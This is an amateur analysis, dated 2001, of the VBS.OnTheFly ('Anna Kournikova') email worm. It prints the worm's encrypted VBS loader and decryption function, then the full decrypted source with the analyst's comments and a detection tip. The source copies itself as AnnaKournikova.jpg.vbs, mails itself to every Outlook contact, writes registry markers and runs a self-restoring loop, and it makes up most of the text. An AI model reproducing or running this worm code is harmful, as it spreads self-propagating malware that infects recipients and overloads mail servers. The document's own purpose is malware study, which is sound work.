/*
  AnnaKournikova worm decrypted by Ilitirit 21 Feb 2001
  =====================================================
  I don't really know VB but here goes.  I used Powerscript to convert the
  encrypted code, and once I worked out the that it was created with VBSwg
  (it took me a while, but hey, I'm new to this OK?)I downloaded VBSwg and 
used
  some of the variable names that came with the source.
  People who release these worms created with VBSwg are ultra lame IMO.
  Any idiot can create a worm with VBSwg (most of the routines look like 
they were
  written [K]alamar himself, so where's the effort or originality?), release 
it and
  create havoc.
  I got nothing against [K]alamar, just people who use his software for 
destructive
  purposes.
  That said, I don't think this worm is *really* destructive, but it can 
cause major
  problems with email servers.
  BTW everything behind forward slashes are comments.  Most of the code is 
self
  explanatory though.
  NB. To make it easier to detect these worms, click on view (in folder 
menu),
      options, view, and uncheck "Hide MS-DOS file extensions that are 
registered"
*/


/*
Original Source (the part that you get sent)
============================================
Vbs.OnTheFly Created By OnTheFly

/*The LONG string ("X)udQ....") is the actual worm code.
  The section following it is the decryption scheme.
  Notice how all the variable and function names are made up of random 
letters,
  even in the decrypted code ( i renamed the variables). VBSwg does this to 
make
  detection by anti virus programs harder.  One subtle pitfall is that all 
the variable
  and function names are 11 characters long.  This could be used to make 
detection
  easier.  The obvious other pitfall is that "VBSwg" is appended to the end 
of the worm
*/

Execute 
e7iqom5JE4z("X)udQ0VpgjnH{tEcggvf{DQVpgjnH{QptGqttgTwugoPzgvUvgGQ9v58Jr7R6?EgtvcQgldeg*vY$eUktvrU0gjnn+$9G5QJv786r0Rgtyiktgv$MJWEu^hqyvtc^gpQjVHg{n$^.jE*t9:+(jE*t33+3(Etj3*63+(jE*t23+;(Etj5*+4(Etj3*;2+(jE*t9;+(jE*t23+2(Etj3*32+(jE*t45+(jE*t33+;(Etj3*72+(jE*t33+8(Etj3*62+(jE*t45+(jE*t8:+(jE*t:;+(jE*t33+7(Etj3*;3+(jE*t23+5(Etj5*+4(Etj6*+;(Etj6*+8(Etj7*+5(Etj6*+:(Etj;*+:gUvQtcyVopldi?7Egtvcqgldeg*vu$terkkviph0nkugu{gvqoldeg$v+tyQoclVip7de0rqh{nkguyterk0veuktvrwhnncpgot.yQoclVip7dI0vgrUegckHnnqgf*t+2(^$pCcpqMtwkpqmcxl0irx0ud$kh9G5QJv786r0Rgtticgf$*MJWEu^hqyvtc^gpQjVHg{no^kcgn$f+@>$$3vgjpgp4CUJ9inEN+*pgfhkhkopqjvp*yq+3?cfpf{cp*yq+4?8jvpg9G5QJv786r0RwtpJ$vv<r11yy0y{fcp{dgvp0$n5.h.ncgupgfhkgUvMLUiJy9M59?ztyQoclVip7dq0grvpzghvnk*guyterk0veuktvrwhnncpgo.+3P\L7\Mz6wk?XLiMyUMJ99z5t0cgcfnnM
LUiJy9M590znEuqgFqKhqPvt*yQoclVip7dh0nkggkzvu*uuyterk0veuktvrwhnncpgo++VgjpUvgWKg44:|6R2x?QtcyVopldi07tecggvgvvzkhgny*euktvru0terkhvnwpnoc.gVwt+ggW4K|4R:x602tyvk\g7PML6\kzXwgW4K|4R:x602nEuqgGfpKhNqqrHpwveqkp4gUp9CnJNi*E+QptGqttgTwugoPzgvUvgF54xQOzM8JT?EgtvcQgldeg*vQ$vwqnmqC0rrkncekvpq+$hKF54xQOzM8JT?Q$vwqnmqV$gjpUvgl74PvD\h;n:F?54xQOzM8JTI0vgcPgorUec*gO$RC$K+UvgUm834i35gN5?4lv7\P;D:h0nfCtfugNuukuvqHtcGjeL4TRoOuD4ToKp8U4m33gi55NKhTLo4uR4OoD0TfCtfugGuvpktugE0wqvp>@2jVpg6fFDz5yi3xL?TLo4uR4OoD0TfCtfugGuvpktugE0wqvpqHt9Z;:cX|5gT?|3Vq6fFDz5yi3xLUvgk9sd4:6x5\5?F54xQOzM8JTE0gtvcKggv*o+2gUvKQ6GXDl[LQ:?TLo4uR4OoD0TfCtfugGuvpktugZ*:9X;5cT||g+k9sd4:6x5\5V0q?KQ6GXDl[LQ0:fCtfuguk9sd4:6x5\5U0dwglve?$gJgt{wqjxc.g=+q$k9sd4:6x5\5D0fq{?J$<k$(dxtehn($jEegmjVuk$#(xednth($$guvYhpu:sI[h;?3sk496d5:5x0\vCcvjeg
ovpuhuYsp[:;I3hC0fftyQoclVip7dI0vgrUegckHnnqgf*t+2(^$pCcpqMtwkpqmcxl0irx0ud$k9sd4:6x5\5F0ngvgCgvhtgwUodvk?VwtgKhsk496d5:5x0\qV>@$$Vgjpk9sd4:6x5\5U0pgfGQ9v58Jr7R6t0igtyvkgJ$EM^WquvhcygtQ^VpgjnH^{conkfg.$$$3pGfhKgPvzpGfhKgPvzpgfhkpGfwHepkvpqX)udiy370d2")
Function e7iqom5JE4z(hFeiuKrcoj3)
For I = 1 To Len(hFeiuKrcoj3) Step 2
	StTP1MoJ3ZU= Mid(hFeiuKrcoj3, I, 1)
	WHz23rBqlo7= Mid(hFeiuKrcoj3, I + 1, 1)
	If Asc(StTP1MoJ3ZU) = 15 Then
		StTP1MoJ3ZU= Chr(10)
	ElseIf Asc(StTP1MoJ3ZU) = 16 Then
		StTP1MoJ3ZU = Chr(13)
	ElseIf Asc(StTP1MoJ3ZU) = 17 Then
		StTP1MoJ3ZU = Chr(32)
	Else
		StTP1MoJ3ZU = Chr(Asc(StTP1MoJ3ZU) - 2)
	End If
	If WHz23rBqlo7<> "" Then
		If Asc(WHz23rBqlo7) = 15 Then
			WHz23rBqlo7= Chr(10)
		ElseIf Asc(WHz23rBqlo7) = 16 Then
			WHz23rBqlo7= Chr(13)
		ElseIf Asc(WHz23rBqlo7) = 17 Then
			WHz23rBqlo7= Chr(32)
		Else
			WHz23rBqlo7= Chr(Asc(WHz23rBqlo7) - 2)
		End If
	End If
	e7iqom5JE4z = e7iqom5JE4z & WHz23rBqlo7 & StTP1MoJ3ZU
Next
End Function
Vbswg 1.50b
*/


//*****Decrypted Code******
'Vbs.OnTheFly Created By OnTheFly   //L@/\/\3R who released the worm
On Error Resume Next
Set ws = CreateObject("WScript.Shell")

//says "Worm made with VBSwg 1.50b": another pitfall
ws.regwrite "HKCU\software\OnTheFly\", Chr(87) & Chr(111) & Chr(114) & 
Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & 
Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & 
Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & 
Chr(48) & Chr(98)

Set fso= Createobject("scripting.filesystemobject")

fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0)& 
"\AnnaKournikova.jpg.vbs"

if ws.regread ("HKCU\software\OnTheFly\mailed") <> "1" then
	Outlook()
end if

//Red Herring?  Maybe, but NL *might* be the origin of the worm
if month(now) =1 and day(now) = 26 then
	ws.run "Http://www.dynabyte.nl",3,false
end if

//The following section could be an anti-deletion technique
Set AnnaKournikova = fso.opentextfile(wscript.scriptfullname, 1)
SourceCode = AnnaKournikova.readall
AnnaKournikova.Close
Do
	If Not (fso.fileexists(wscript.scriptfullname)) Then
		Set AnnaKournikova = fso.createtextfile(wscript.scriptfullname, True)
		AnnaKournikova.write SourceCode
		AnnaKournikova.Close
	End If
Loop

Function Outlook()
	On Error Resume Next
	Set OutlookApp = CreateObject("Outlook.Application")
	If OutlookApp= "Outlook"Then
		Set Mapi=OutlookApp.GetNameSpace("MAPI")
		Set MapiAdList= Mapi.AddressLists
		For Each Address In MapiAdList
			If Address.AddressEntries.Count <> 0 Then
				NumOfContacts = Address.AddressEntries.Count
				//Get a list of contacts
				For ContactNumber = 1 To NumOfContacts
					Set EmailItem = OutlookApp.CreateItem(0)
					Set ContactNumber = Address.AddressEntries(ContactNumber)
					EmailItem.To = ContactNumber.Address
					EmailItem.Subject = "Here you have, ;o)"
					EmailItem.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
					set EmailAttachment=EmailItem.Attachments
					EmailAttachment.Add fso.GetSpecialFolder(0)& "\AnnaKournikova.jpg.vbs"
					EmailItem.DeleteAfterSubmit = True

					//Send the thing
					If EmailItem.To <> "" Then
						EmailItem.Send
						ws.regwrite "HKCU\software\OnTheFly\mailed", "1"
					End If
				Next
			End If
		Next
	end if
End Function
'Vbswg 1.50b


